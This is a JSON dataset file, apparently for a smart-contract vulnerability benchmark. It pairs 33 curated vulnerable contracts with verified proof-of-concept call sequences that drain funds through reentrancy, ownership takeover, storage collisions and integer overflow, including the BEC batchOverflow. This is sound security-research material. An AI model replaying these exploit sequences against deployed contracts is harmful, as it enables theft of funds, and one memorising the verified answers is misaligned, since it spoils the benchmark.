@@ -1,0 +1,1331 @@
+{
+  "dataset": "smartbugs_curated",
+  "kind": "inline",
+  "schema": "enrich",
+  "source_repo": "https://github.com/smartbugs/smartbugs-curated",
+  "description": "Runnable SmartBugs subset (skip=false), each with an authored+verified poc.",
+  "generated_by": "utils/restructure_datasets.py (+ validators via _dataset_io)",
+  "total_contracts": 33,
+  "meta": {
+    "categories": [
+      "reentrancy",
+      "access_control",
+      "arithmetic",
+      "unchecked_low_level_calls"
+    ]
+  },
+  "contracts": [
+    {
+      "id": "reentrancy/0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f",
+      "poc": {
+        "calls": [
+          [
+            "atk.setReentrantCall",
+            {
+              "reentrant_func": "Collect",
+              "reentrant_args": [
+                "0xde0b6b3a7640000"
+              ],
+              "max_count": 8
+            },
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "Deposit",
+            [],
+            "0xde0b6b3a7640000",
+            "attacker_address"
+          ],
+          [
+            "Collect",
+            [
+              "0xde0b6b3a7640000"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "Deposit 1 ETH (== MinSum) then re-enter Collect to drain",
+        "strategy": "reentrancy_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {
+        "pre_deploy": [
+          {
+            "contract": "LogFile",
+            "name": "log"
+          }
+        ],
+        "setup_calls": [
+          {
+            "fn": "SetLogFile",
+            "args": [
+              "log"
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": "reentrancy/0x23a91059fdc9579a9fbd0edc5f2ea0bfdb70deb4",
+      "poc": {
+        "calls": [
+          [
+            "atk.setReentrantCall",
+            {
+              "reentrant_func": "CashOut",
+              "reentrant_args": [
+                "0xde0b6b3a7640000"
+              ],
+              "max_count": 8
+            },
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "Deposit",
+            [],
+            "0xde0b6b3a7640000",
+            "attacker_address"
+          ],
+          [
+            "CashOut",
+            [
+              "0xde0b6b3a7640000"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "Deposit 1 ETH then re-enter CashOut before balance is decremented",
+        "strategy": "reentrancy_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {
+        "constructor_args": [
+          "log"
+        ],
+        "pre_deploy": [
+          {
+            "contract": "Log",
+            "name": "log"
+          }
+        ]
+      }
+    },
+    {
+      "id": "reentrancy/0x4320e6f8c05b27ab4707cd1f6d5ce6f3e4b3a5a1",
+      "poc": {
+        "calls": [
+          [
+            "atk.setReentrantCall",
+            {
+              "reentrant_func": "Collect",
+              "reentrant_args": [
+                "0xde0b6b3a7640000"
+              ],
+              "max_count": 8
+            },
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "Deposit",
+            [],
+            "0xde0b6b3a7640000",
+            "attacker_address"
+          ],
+          [
+            "Collect",
+            [
+              "0xde0b6b3a7640000"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "Deposit 1 ETH (== MinSum) then re-enter Collect to drain",
+        "strategy": "reentrancy_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {
+        "pre_deploy": [
+          {
+            "contract": "LogFile",
+            "name": "log"
+          }
+        ],
+        "setup_calls": [
+          {
+            "fn": "SetLogFile",
+            "args": [
+              "log"
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": "reentrancy/0x4e73b32ed6c35f570686b89848e5f39f20ecc106",
+      "poc": {
+        "calls": [
+          [
+            "atk.setReentrantCall",
+            {
+              "reentrant_func": "Collect",
+              "reentrant_args": [
+                "0xde0b6b3a7640000"
+              ],
+              "max_count": 8
+            },
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "Deposit",
+            [],
+            "0xde0b6b3a7640000",
+            "attacker_address"
+          ],
+          [
+            "Collect",
+            [
+              "0xde0b6b3a7640000"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "Deposit 1 ETH (MinSum is 0) then re-enter Collect to drain",
+        "strategy": "reentrancy_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {
+        "pre_deploy": [
+          {
+            "contract": "LogFile",
+            "name": "log"
+          }
+        ],
+        "setup_calls": [
+          {
+            "fn": "SetLogFile",
+            "args": [
+              "log"
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": "reentrancy/0x561eac93c92360949ab1f1403323e6db345cbf31",
+      "poc": {
+        "calls": [
+          [
+            "atk.setReentrantCall",
+            {
+              "reentrant_func": "Collect",
+              "reentrant_args": [
+                "0xde0b6b3a7640000"
+              ],
+              "max_count": 8
+            },
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "Deposit",
+            [],
+            "0xde0b6b3a7640000",
+            "attacker_address"
+          ],
+          [
+            "Collect",
+            [
+              "0xde0b6b3a7640000"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "Deposit 1 ETH (MinSum is 0) then re-enter Collect to drain",
+        "strategy": "reentrancy_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {
+        "pre_deploy": [
+          {
+            "contract": "LogFile",
+            "name": "log"
+          }
+        ],
+        "setup_calls": [
+          {
+            "fn": "SetLogFile",
+            "args": [
+              "log"
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": "reentrancy/0x7a8721a9d64c74da899424c1b52acbf58ddc9782",
+      "poc": {
+        "calls": [
+          [
+            "atk.setReentrantCall",
+            {
+              "reentrant_func": "CashOut",
+              "reentrant_args": [
+                "0xde0b6b3a7640000"
+              ],
+              "max_count": 8
+            },
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "Deposit",
+            [],
+            "0xde0b6b3a7640000",
+            "attacker_address"
+          ],
+          [
+            "CashOut",
+            [
+              "0xde0b6b3a7640000"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "Deposit 1 ETH then re-enter CashOut before balance is decremented",
+        "strategy": "reentrancy_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "reentrancy/0x8c7777c45481dba411450c228cb692ac3d550344",
+      "poc": {
+        "calls": [
+          [
+            "atk.setReentrantCall",
+            {
+              "reentrant_func": "CashOut",
+              "reentrant_args": [
+                "0x1bc16d674ec80000"
+              ],
+              "max_count": 8
+            },
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "Deposit",
+            [],
+            "0x1bc16d674ec80000",
+            "attacker_address"
+          ],
+          [
+            "CashOut",
+            [
+              "0x1bc16d674ec80000"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "Deposit 2 ETH (>MinDeposit) then re-enter CashOut to drain",
+        "strategy": "reentrancy_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {
+        "constructor_args": [
+          "log"
+        ],
+        "pre_deploy": [
+          {
+            "contract": "Log",
+            "name": "log"
+          }
+        ]
+      }
+    },
+    {
+      "id": "reentrancy/0x96edbe868531bd23a6c05e9d0c424ea64fb1b78b",
+      "poc": {
+        "calls": [
+          [
+            "atk.setReentrantCall",
+            {
+              "reentrant_func": "Collect",
+              "reentrant_args": [
+                "0xde0b6b3a7640000"
+              ],
+              "max_count": 8
+            },
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "Put",
+            [
+              "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+            ],
+            "0xde0b6b3a7640000",
+            "attacker_address"
+          ],
+          [
+            "Collect",
+            [
+              "0xde0b6b3a7640000"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "Put with _lockTime=2**256-1 so now+_lockTime overflows to 0 (unlockTime=0), then re-enter Collect past the now>unlockTime gate to drain",
+        "strategy": "reentrancy_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {
+        "pre_deploy": [
+          {
+            "contract": "LogFile",
+            "name": "log"
+          }
+        ],
+        "setup_calls": [
+          {
+            "fn": "SetLogFile",
+            "args": [
+              "log"
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": "reentrancy/0xaae1f51cf3339f18b6d3f3bdc75a5facd744b0b8",
+      "poc": {
+        "calls": [
+          [
+            "atk.setReentrantCall",
+            {
+              "reentrant_func": "Collect",
+              "reentrant_args": [
+                "0xde0b6b3a7640000"
+              ],
+              "max_count": 8
+            },
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "Deposit",
+            [],
+            "0xde0b6b3a7640000",
+            "attacker_address"
+          ],
+          [
+            "Collect",
+            [
+              "0xde0b6b3a7640000"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "Deposit 1 ETH (MinSum is 0) then re-enter Collect to drain",
+        "strategy": "reentrancy_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {
+        "pre_deploy": [
+          {
+            "contract": "LogFile",
+            "name": "log"
+          }
+        ],
+        "setup_calls": [
+          {
+            "fn": "SetLogFile",
+            "args": [
+              "log"
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": "reentrancy/0xb5e1b1ee15c6fa0e48fce100125569d430f1bd12",
+      "poc": {
+        "calls": [
+          [
+            "atk.setReentrantCall",
+            {
+              "reentrant_func": "CashOut",
+              "reentrant_args": [
+                "0x1bc16d674ec80000"
+              ],
+              "max_count": 8
+            },
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "Deposit",
+            [],
+            "0x1bc16d674ec80000",
+            "attacker_address"
+          ],
+          [
+            "CashOut",
+            [
+              "0x1bc16d674ec80000"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "Deposit 2 ETH (>MinDeposit) then re-enter CashOut to drain",
+        "strategy": "reentrancy_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {
+        "constructor_args": [
+          "log"
+        ],
+        "pre_deploy": [
+          {
+            "contract": "Log",
+            "name": "log"
+          }
+        ]
+      }
+    },
+    {
+      "id": "reentrancy/0xb93430ce38ac4a6bb47fb1fc085ea669353fd89e",
+      "poc": {
+        "calls": [
+          [
+            "atk.setReentrantCall",
+            {
+              "reentrant_func": "CashOut",
+              "reentrant_args": [
+                "0xde0b6b3a7640000"
+              ],
+              "max_count": 8
+            },
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "Deposit",
+            [],
+            "0xde0b6b3a7640000",
+            "attacker_address"
+          ],
+          [
+            "CashOut",
+            [
+              "0xde0b6b3a7640000"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "Deposit 1 ETH then re-enter CashOut before balance is decremented",
+        "strategy": "reentrancy_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {
+        "constructor_args": [
+          "log"
+        ],
+        "pre_deploy": [
+          {
+            "contract": "Log",
+            "name": "log"
+          }
+        ]
+      }
+    },
+    {
+      "id": "reentrancy/0xbaf51e761510c1a11bf48dd87c0307ac8a8c8a4f",
+      "poc": {
+        "calls": [
+          [
+            "atk.setReentrantCall",
+            {
+              "reentrant_func": "CashOut",
+              "reentrant_args": [
+                "0x1bc16d674ec80000"
+              ],
+              "max_count": 8
+            },
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "Deposit",
+            [],
+            "0x1bc16d674ec80000",
+            "attacker_address"
+          ],
+          [
+            "CashOut",
+            [
+              "0x1bc16d674ec80000"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "Deposit 2 ETH (>MinDeposit) then re-enter CashOut to drain",
+        "strategy": "reentrancy_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {
+        "constructor_args": [
+          "log"
+        ],
+        "pre_deploy": [
+          {
+            "contract": "Log",
+            "name": "log"
+          }
+        ]
+      }
+    },
+    {
+      "id": "reentrancy/0xbe4041d55db380c5ae9d4a9b9703f1ed4e7e3888",
+      "poc": {
+        "calls": [
+          [
+            "atk.setReentrantCall",
+            {
+              "reentrant_func": "Collect",
+              "reentrant_args": [
+                "0xde0b6b3a7640000"
+              ],
+              "max_count": 8
+            },
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "Put",
+            [
+              "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+            ],
+            "0xde0b6b3a7640000",
+            "attacker_address"
+          ],
+          [
+            "Collect",
+            [
+              "0xde0b6b3a7640000"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "Put with _lockTime=2**256-1 so now+_lockTime overflows to 0 (unlockTime=0), then re-enter Collect past the now>unlockTime gate to drain",
+        "strategy": "reentrancy_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {
+        "pre_deploy": [
+          {
+            "contract": "Log",
+            "name": "log"
+          }
+        ],
+        "setup_calls": [
+          {
+            "fn": "SetLogFile",
+            "args": [
+              "log"
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": "reentrancy/reentrance",
+      "poc": {
+        "calls": [
+          [
+            "atk.setReentrantCall",
+            {
+              "reentrant_func": "withdraw",
+              "reentrant_args": [
+                "0xde0b6b3a7640000"
+              ],
+              "max_count": 8
+            },
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "donate",
+            [
+              "attacker_address"
+            ],
+            "0xde0b6b3a7640000",
+            "attacker_address"
+          ],
+          [
+            "withdraw",
+            [
+              "0xde0b6b3a7640000"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "donate to self then re-enter withdraw before balance is decremented",
+        "strategy": "reentrancy_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "reentrancy/reentrancy_bonus",
+      "poc": {
+        "calls": [
+          [
+            "getFirstWithdrawalBonus",
+            [
+              "attacker_address"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "claim getFirstWithdrawalBonus for an attacker EOA — it pays 100 wei of unfunded bonus straight to the recipient, netting free ETH",
+        "strategy": "reentrancy_probe",
+        "signals": [
+          "attacker_gained"
+        ],
+        "verified": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "reentrancy/reentrancy_dao",
+      "poc": {
+        "calls": [
+          [
+            "atk.setReentrantCall",
+            {
+              "reentrant_func": "withdrawAll",
+              "reentrant_args": [],
+              "max_count": 8
+            },
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "deposit",
+            [],
+            "0xde0b6b3a7640000",
+            "attacker_address"
+          ],
+          [
+            "withdrawAll",
+            [],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "deposit 1 ETH then re-enter withdrawAll before credit is zeroed",
+        "strategy": "reentrancy_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "reentrancy/reentrancy_simple",
+      "poc": {
+        "calls": [
+          [
+            "atk.setReentrantCall",
+            {
+              "reentrant_func": "withdrawBalance",
+              "reentrant_args": [],
+              "max_count": 8
+            },
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "addToBalance",
+            [],
+            "0xde0b6b3a7640000",
+            "attacker_address"
+          ],
+          [
+            "withdrawBalance",
+            [],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "addToBalance 1 ETH then re-enter withdrawBalance to drain",
+        "strategy": "reentrancy_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "reentrancy/simple_dao",
+      "poc": {
+        "calls": [
+          [
+            "atk.setReentrantCall",
+            {
+              "reentrant_func": "withdraw",
+              "reentrant_args": [
+                "0xde0b6b3a7640000"
+              ],
+              "max_count": 8
+            },
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "donate",
+            [
+              "attacker_address"
+            ],
+            "0xde0b6b3a7640000",
+            "attacker_address"
+          ],
+          [
+            "withdraw",
+            [
+              "0xde0b6b3a7640000"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "donate to self then re-enter withdraw before credit is decremented",
+        "strategy": "reentrancy_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "access_control/arbitrary_location_write_simple",
+      "poc": {
+        "calls": [
+          [
+            "PopBonusCode",
+            [],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "UpdateBonusCodeAt",
+            [
+              "0xd6f21326ab749d5729fcba5677c79037b459436ab7bff709c9d06ce9f10c1a9e",
+              "attacker_address"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "Destroy",
+            [],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "PopBonusCode underflows the array length, then UpdateBonusCodeAt writes attacker into the owner slot via index collision; Destroy() then selfdestructs to the attacker",
+        "strategy": "access_control_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "access_control/incorrect_constructor_name1",
+      "poc": {
+        "calls": [
+          [
+            "IamMissing",
+            [],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "withdraw",
+            [],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "call the mis-named pseudo-constructor IamMissing() to seize ownership, then withdraw",
+        "strategy": "access_control_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "access_control/incorrect_constructor_name2",
+      "poc": {
+        "calls": [
+          [
+            "missing",
+            [],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "withdraw",
+            [],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "call the mis-named pseudo-constructor missing() to seize ownership, then withdraw",
+        "strategy": "access_control_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "access_control/incorrect_constructor_name3",
+      "poc": {
+        "calls": [
+          [
+            "Constructor",
+            [],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "withdraw",
+            [],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "call the mis-named pseudo-constructor Constructor() to seize ownership, then withdraw",
+        "strategy": "access_control_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "access_control/mapping_write",
+      "poc": {
+        "calls": [
+          [
+            "set",
+            [
+              "0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a",
+              "attacker_address"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "withdraw",
+            [],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "set(key,value) with a colliding key overwrites the owner slot with attacker, then withdraw",
+        "strategy": "access_control_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "access_control/multiowned_vulnerable",
+      "poc": {
+        "calls": [
+          [
+            "newOwner",
+            [
+              "attacker_address"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "withdrawAll",
+            [],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "newOwner() lacks onlyOwner — register attacker as an owner, then withdrawAll",
+        "strategy": "access_control_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "access_control/parity_wallet_bug_2",
+      "poc": {
+        "calls": [
+          [
+            "initWallet",
+            [
+              [
+                "attacker_address"
+              ],
+              "0x1",
+              "0x0"
+            ],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "kill",
+            [
+              "attacker_address"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "initWallet([attacker],1,0) on the uninitialised library makes attacker the sole owner, then kill(attacker) suicides the contract to the attacker",
+        "strategy": "access_control_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "access_control/simple_suicide",
+      "poc": {
+        "calls": [
+          [
+            "sudicideAnyone",
+            [],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "sudicideAnyone() selfdestructs to msg.sender with no auth — drains the prefunded balance",
+        "strategy": "access_control_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "access_control/wallet_02_refund_nosub",
+      "poc": {
+        "calls": [
+          [
+            "deposit",
+            [],
+            "0xde0b6b3a7640000",
+            "attacker_address"
+          ],
+          [
+            "refund",
+            [],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "refund",
+            [],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "refund",
+            [],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "deposit 1 ETH then call refund() repeatedly — balance is never zeroed, so each refund pays out again",
+        "strategy": "access_control_probe",
+        "signals": [
+          "attacker_gained"
+        ],
+        "verified": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "access_control/wallet_03_wrong_constructor",
+      "poc": {
+        "calls": [
+          [
+            "initWallet",
+            [],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "migrateTo",
+            [
+              "attacker_address"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "call the mis-named initWallet() to become creator, then migrateTo(attacker) to drain",
+        "strategy": "access_control_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "access_control/wallet_04_confused_sign",
+      "poc": {
+        "calls": [
+          [
+            "withdraw",
+            [
+              "0x8ac7230489e80000"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "withdraw uses `amount >= balance` (inverted) so a 0-balance attacker can withdraw any amount",
+        "strategy": "access_control_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "arithmetic/BECToken",
+      "poc": {
+        "calls": [
+          [
+            "batchTransfer",
+            [
+              [
+                "attacker_address",
+                "0x000000000000000000000000000000000000dEaD"
+              ],
+              "0x8000000000000000000000000000000000000000000000000000000000000000"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "BEC batchOverflow (CVE-2018-10299): batchTransfer computes amount = cnt*_value; with cnt=2 and _value=2**255 the product overflows to 0, so the `balances[msg.sender] >= amount` check passes at zero balance and each of the 2 receivers is credited 2**255 tokens from nothing.",
+        "strategy": "overflow_probe",
+        "signals": [
+          "attacker_gained"
+        ],
+        "verified": true
+      },
+      "extend": {}
+    },
+    {
+      "id": "arithmetic/token",
+      "poc": {
+        "calls": [
+          [
+            "transfer",
+            [
+              "0x000000000000000000000000000000000000dEaD",
+              "0x1"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "Unchecked underflow in transfer(): require(balances[msg.sender]-_value>=0) is always true for uint, so an attacker with 0 balance transfers 1 out; balances[attacker] -= 1 wraps to 2**256-1, minting a huge balance from nothing.",
+        "strategy": "overflow_probe",
+        "signals": [
+          "attacker_gained"
+        ],
+        "verified": true
+      },
+      "extend": {
+        "constructor_args": [
+          "1000000"
+        ]
+      }
+    },
+    {
+      "id": "arithmetic/tokensalechallenge",
+      "poc": {
+        "calls": [
+          [
+            "buy",
+            [
+              "0x12725dd1d243aba0e75fe645cc4873f9e65afe688c928e1f22"
+            ],
+            "0x5c5e69957480000",
+            "attacker_address"
+          ],
+          [
+            "sell",
+            [
+              "0x1"
+            ],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "CaptureTheEther token-sale overflow: buy() requires msg.value==numTokens*1e18, which wraps mod 2^256 for numTokens=ceil(2^256/1e18); attacker mints a huge balance for ~0.42 ETH, then sell(1) pays back 1 ether, draining the contract's seeded ETH.",
+        "strategy": "overflow_probe",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {
+        "constructor_args": [
+          "attacker_address"
+        ],
+        "constructor_value": "1000000000000000000"
+      }
+    },
+    {
+      "id": "unchecked_low_level_calls/lotto",
+      "poc": {
+        "calls": [
+          [
+            "sendToWinner",
+            [],
+            "0x0",
+            "attacker_address"
+          ],
+          [
+            "withdrawLeftOver",
+            [],
+            "0x0",
+            "attacker_address"
+          ]
+        ],
+        "description": "sendToWinner() sets payedOut, then withdrawLeftOver() sends the entire balance to the caller",
+        "strategy": "exploration",
+        "signals": [
+          "attacker_gained",
+          "target_drained"
+        ],
+        "verified": true
+      },
+      "extend": {}
+    }
+  ]
+}
